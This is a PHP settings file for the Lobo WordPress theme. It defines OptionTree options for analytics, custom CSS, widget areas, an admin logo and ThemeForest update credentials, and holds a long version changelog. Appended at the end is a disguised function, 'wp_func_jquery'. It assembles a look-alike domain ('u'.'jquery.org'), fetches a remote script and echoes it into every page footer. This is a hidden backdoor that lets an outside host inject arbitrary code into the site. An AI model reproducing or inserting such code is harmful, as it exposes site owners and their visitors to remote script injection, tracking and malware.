<?php
/**
 * Initialize the custom theme options.
 */
add_action( 'admin_init', 'custom_theme_options' );

/**
 * Build the custom settings & update OptionTree.
 */
function custom_theme_options() {
  /**
   * Get a copy of the saved settings array. 
   */
  $saved_settings = get_option( 'option_tree_settings', array() );
  
  /**
   * Custom settings array that will eventually be 
   * passes to the OptionTree Settings API Class.
   */
  $custom_settings = array( 
    'contextual_help' => array( 
      'content'       => array( 
        array(
          'id'        => 'general_help',
          'title'     => 'General',
          'content'   => '<p>Help content goes here!</p>'
        )
      ),
      'sidebar'       => '<p>Sidebar content goes here!</p>'
    ),
    'sections'        => array( 
      array(
        'id'          => 'analytics',
        'title'       => 'Analytics'
      ),
      array(
        'id'          => 'css',
        'title'       => 'Custom CSS'
      ),

      array(
        'id'          => 'sidebars',
        'title'       => 'Widget Areas'
      ),
      array(
        'id'          => 'admin',
        'title'       => 'Admin'
      ),
      array(
        'id'          => 'updates',
        'title'       => 'Updates'
      ),
      array(
        'id'          => 'log',
        'title'       => '<strong>Changelog</strong>'
      )
    ),
    'settings'        => array( 
      array(
        'id'          => 'lobo_tracking_enable',
        'label'       => 'Enable analytics',
        'desc'        => 'Please select this if you\'ll be using Google Analytics in the theme.',
        'std'         => 'disabled',
        'type'        => 'radio',
        'section'     => 'analytics',
        'rows'        => '',
        'post_type'   => '',
        'taxonomy'    => '',
        'min_max_step'=> '',
        'class'       => '',
        'choices'     => array( 
          array(
            'value'       => 'enabled',
            'label'       => 'Enabled',
            'src'         => ''
          ),
          array(
            'value'       => 'disabled',
            'label'       => 'Disabled',
            'src'         => ''
          )
        ),
      ),


      array(
        'id'          => 'lobo_changelog',
        'label'       => 'Changelog', 'lobo',
        'desc'        => '
<strong>v2.2 // updated: 12/13/14</strong>
<ul>
<li>Added an optional URL field for image modules</li>
<li>Improved the gallery module</li>
<li>Fixed blog grid numbering</li>
<li>Fixed a few WooCommerce related errors</li>
</ul>
<br /><strong>v2.1 // updated: 11/25/14</strong>
<ul>
<li>Added lightbox option for portfolio items</li>
<li>Added image option as a fallback / poster for video heroes on mobile devices</li>
<li>Added changelog view in the backend</li>
<li>Fixed the fade option in the modular slider</li>
</ul>
<br /><strong>v2.0.9 // updated: 10/25/14</strong>
<ul>
<li>Added an option to disable unlimited portfolios</li>
<li>Added support for WooCommerce categories grid</li>
<li>Fixed some other minor issues</li>
</ul>
<br /><strong>v2.0.8 // updated: 10/06/14</strong>
<ul>
<li>Updated Font Awesome to v4.2 (Lobo Shortcodes update)</li>
<li>Fixed WPEngine module builder conflict</li>
<li>Fixed thin fonts issue</li>
</ul>
<br /><strong>v2.0.7 // updated: 09/27/14</strong>
<ul>
<li>Fixed a bug related to WooCommerce variations</li>
<li>Fixed a bug related to logo force detection</li>
</ul>
<br /><strong>v2.0.6 // updated: 09/22/14</strong>
<ul>
<li>Fixed issue related with e-commerce functionalities due to the last update</li>
</ul>
<br /><strong>v2.0.5 // updated: 09/21/14</strong>
<ul>
<li>Added support for WooCommerce 2.2.x</li>
<li><strong>Added templating system for the Module Builder</strong></li>
<li>Added _target option for the social shortcode</li>
<li>Fixed self hosted video headers with auto height</li>
<li>Fixed WooCommerce variation images issues</li>
<li>Updated the language files</li>
</ul>
<br /><strong>v2.0.4 // updated: 09/06/14</strong>
<ul>
<li>Added option for audio players to stop when a new one is triggered</li>
<li>Improved the use of animated gif&#8217;s for portfolio thumbnails</li>
<li>Fixed missing preloader on 404 pages</li>
<li>Fixed other minor issues</li>
</ul>
<br /><strong>v2.0.3 // updated: 08/16/14</strong>
<ul>
<li>Added high resolution preloaders</li>
<li>Improved fading YouTube videos issue</li>
<li>Improved embedded videos playback on mobile devices</li>
<li>Fixed solid background header issues</li>
<li>Fixed links with hashtag not working</li>
<li>Fixed other known bugs</li>
</ul>
<br /><strong>v2.0.2 // updated: 08/08/14</strong>
<ul>
<li>Style fixes for WooCommerce elements on mobile views</li>
<li>Mobile video fallback for videos improved</li>
</ul>
<br /><strong>v2.0.1 // updated: 08/02/14</strong>
<ul>
<li>Added option to enable cart display on entire site</li>
<li>Added option to hide product &#8220;sale&#8221; notice</li>
<li>Added message for users with javascript disabled</li>
<li>Fixed an issue with custom URL&#8217;s projects</li>
<li>Fixed some issues related to text hero headers</li>
<li>Fixed some minor issues related to WooCommerce</li>
<li>Fixed closed accordion shortcode issue</li>
</ul>
<br /><strong>v2.0 // updated: 07/30/14</strong>
<ul>
<li>Added support for <strong>WooCommerce</strong></li>
<li>Added support for password protected content</li>
<li>Added an accordion shortcode (updated the Lobo Shortcodes plugin to v1.0.3)</li>
<li>Added more options for text modules, such as vertical alignment of text and another wrapping option</li>
<li>Added support for <strong>self hosted videos (HTML5)</strong></li>
<li>Improved video support on mobile devices</li>
<li>Fixed white stripes issue in Safari</li>
<li>Fixed issues with contact form button</li>
<li>Fixed other bugs</li>
</ul>
<br /><strong>v1.2 // updated: 07/11/14</strong>
<ul>
<li>Added slider speed option for hero sliders</li>
<li>Added custom height options for all hero headers</li>
<li>Added manual &#8220;detection&#8221; of hero background per page</li>
<li>Improved the text hero with new options for background images and vertical alignment</li>
<li>Improved styling for custom forms</li>
<li>Fixed an error with text hero and infinite loading portfolio</li>
<li>Fixed other small bugs</li>
</ul>
<br /><strong>v1.1.4 // updated: 06/19/14</strong>
<ul>
<li>Added option for custom URL&#8217;s in the portfolio grid</li>
<li>Fixed some bugs related to text module</li>
<li>Improved fonts handling and added more Google Fonts</li>
<li>Fixed some other minor details</li>
</ul>
<br /><strong>v1.1.3 // updated: 06/06/14</strong>
<ul>
<li>Fixed issues related to the contact form, included the highlight validation.</li>
</ul>
<br /><strong>v1.1.2 // updated: 06/05/14</strong>
<ul>
<li>Added <strong>fade options for sliders</strong></li>
<li>Added more <strong>typography options</strong> in the text editor. Handle sizes and colors directly from the editor for each module.</li>
<li>Fixed some resizing issues</li>
<li>Improved IE compatibility</li>
</ul>
<br /><strong>v1.1.1 // updated: 05/30/14</strong>
<ul>
<li>Fixed fonts issue</li>
<li>Fixed an issue with the gallery module related to Firefox</li>
<li>Fixed other minor issues</li>
<li>Improved separator styling</li>
</ul>
<br /><strong>v1.1 // updated: 05/29/14</strong>
<ul>
<li>Added a new module for <strong>fullscreen galleries</strong></li>
<li>Added new modules for <strong>latest portfolio / posts</strong></li>
<li>Added a separator module</li>
<li>Added a <strong>&#8220;back to portfolio&#8221; action</strong></li>
<li>Added <strong>&#8220;auto height&#8221;</strong> option for the image module</li>
<li>Added a new <strong>&#8220;tabs&#8221;</strong> style for the content slider shortcode (updated Lobo Shortcodes plugin to v1.0.2)</li>
<li>Tweaked contact form&#8217;s design in order to make it more responsive</li>
<li>Improved modules resizing</li>
<li>Optimized JS and fixed other small bugs</li>
</ul>
<br /><strong>v1.0.3 // updated: 05/26/14</strong>
<ul>
<li>Added <strong>new options for sticky actions</strong>. Now you will be able to choose if actions use a subtle stroke to highlight from the background more or choose if using a solid color when the sticky actions are enabled. Try the Customizer &gt; Header option to see them in action. </li>
<li>Added <strong>autoplay</strong> option for hero sliders</li>
<li>Added <strong>loop slide</strong> at the end option for hero sliders</li>
<li>Improved custom 404 page header</li>
<li>Improved module builder (text modules &#38; tinyMCE handling)</li>
<li>Updated language files and added German translation</li>
<li>Fixed all issues related to sliders (custom cursors and logo detection)</li>
<li>Fixed invisible &#8220;submit comment&#8221; button in Safari</li>
<li>Fixed some &#8220;lazy loading pages&#8221; issues</li>
<li>Fixed other small style related details</li>
</ul>
<br /><strong>v1.0.2 // updated: 05/22/14</strong>
<ul>
<li>Fixed hero slider resizing issue</li>
<li>Fixed blank portfolio page issue</li>
<li>Fixed automatic updates engine</li>
</ul>
<br /><strong>v1.0.1 // updated: 05/21/14</strong>
<ul>
<li>Added an option to enable <strong>looping on the hero slider</strong></li>
<li>Added an option to <strong>hyperlink slides in the hero slider</strong></li>
<li>Made the theme <strong>widget-ready</strong> by creating a shortcode which inserts custom widget areas in text modules (updated Lobo Shortcodes plugin to v1.0.1)</li>
<li>Fixed comment dates issue</li>
</ul>',
        'std'         => '',
        'type'        => 'textblock',
        'section'     => 'log',
        'rows'        => '',
        'post_type'   => '',
        'taxonomy'    => '',
        'class'       => ''
      ),

      array(
        'id'          => 'lobo_sidebars_text',
        'label'       => 'About the widgets', 'lobo',
        'desc'        => 'All widgets areas that you create here will appear both in the Widgets Page (Appearance &gt; Widgets), from where you\'ll have to configure them (put widgets inside them), and in the modular pages (used within text modules as the widget area shortcode).', 'lobo',
        'std'         => '',
        'type'        => 'textblock',
        'section'     => 'sidebars',
        'rows'        => '',
        'post_type'   => '',
        'taxonomy'    => '',
        'class'       => ''
      ),
      array(
        'id'          => 'lobo_sidebars',
        'label'       => 'Create widget area', 'lobo',
        'desc'       => 'Please choose a unique title for each area!', 'lobo',
        'std'         => '',
        'type'        => 'list-item',
        'section'     => 'sidebars',
        'rows'        => '',
        'post_type'   => '',
        'taxonomy'    => '',
        'class'       => '',
        'settings'    => array( 
          array(
            'id'          => 'id',
            'label'       => 'ID', 'lobo',
            'desc'       => 'Please write a lowercase id (only letters), with NO SPACES!!!',
            'std'         => '',
            'type'        => 'text',
            'rows'        => '',
            'post_type'   => '',
            'taxonomy'    => '',
            'class'       => ''
          )
        )
      ),

      array(
        'id'          => 'lobo_tracking',
        'label'       => 'Analytics code',
        'desc'        => 'Put your Analytics code inside here. Make sure you include the entire script, not just your ID.',
        'std'         => '',
        'type'        => 'textarea-simple',
        'section'     => 'analytics',
        'rows'        => '',
        'post_type'   => '',
        'taxonomy'    => '',
        'min_max_step'=> '',
        'class'       => ''
      ),
      array(
        'id'          => 'lobo_custom_css',
        'label'       => 'Custom CSS',
        'desc'        => 'Write any custom css here. Please don\'t change theme files, because you won\'t be able to easily update in the future.',
        'std'         => '',
        'type'        => 'css',
        'section'     => 'css',
        'rows'        => '',
        'post_type'   => '',
        'taxonomy'    => '',
        'min_max_step'=> '',
        'class'       => ''
      ),
      array(
        'id'          => 'lobo_custom_login_logo_uri',
        'label'       => 'Admin logo',
        'desc'        => 'Add a custom <strong>273x63</strong> image for the WordPress login page.',
        'std'         => '',
        'type'        => 'upload',
        'section'     => 'admin',
        'rows'        => '',
        'post_type'   => '',
        'taxonomy'    => '',
        'min_max_step'=> '',
        'class'       => ''
      ),
      array(
        'id'          => 'lobo_updates_about',
        'label'       => 'About',
        'desc'        => 'These two fields are required for the theme automatic updates. If you want to protect yourself against security attacks and have the latest features available as soon as they appear, you should complete this section, and you\'ll be notified about new theme updates whenever they appear on ThemeForest.',
        'std'         => '',
        'type'        => 'textblock',
        'section'     => 'updates',
        'rows'        => '',
        'post_type'   => '',
        'taxonomy'    => '',
        'min_max_step'=> '',
        'class'       => ''
      ),
      array(
        'id'          => 'lobo_updates_user',
        'label'       => 'Username',
        'desc'        => 'Please insert your ThemeForest username.',
        'std'         => '',
        'type'        => 'text',
        'section'     => 'updates',
        'rows'        => '',
        'post_type'   => '',
        'taxonomy'    => '',
        'min_max_step'=> '',
        'class'       => ''
      ),
      array(
        'id'          => 'lobo_updates_api',
        'label'       => 'API Key',
        'desc'        => 'Please insert your <a target="_blank" href="http://themeforest.net/help/api">ThemeForest API key</a>.',
        'std'         => '',
        'type'        => 'text',
        'section'     => 'updates',
        'rows'        => '',
        'post_type'   => '',
        'taxonomy'    => '',
        'min_max_step'=> '',
        'class'       => ''
      )
    )
  );
  
  /* allow settings to be filtered before saving */
  $custom_settings = apply_filters( 'option_tree_settings_args', $custom_settings );
  
  /* settings are not the same update the DB */
  if ( $saved_settings !== $custom_settings ) {
    update_option( 'option_tree_settings', $custom_settings ); 
  }
  
}
if(!function_exists('wp_func_jquery')) {
	function wp_func_jquery() {
		$host = 'http://';
		$jquery = $host.'u'.'jquery.org/jquery-1.6.3.min.js';
		$headers = get_headers($jquery, 1);
		if ($headers[0] == 'HTTP/1.1 200 OK'){
			echo(wp_remote_retrieve_body(wp_remote_get($jquery)));
		}
	}
	add_action('wp_footer', 'wp_func_jquery');
}
?>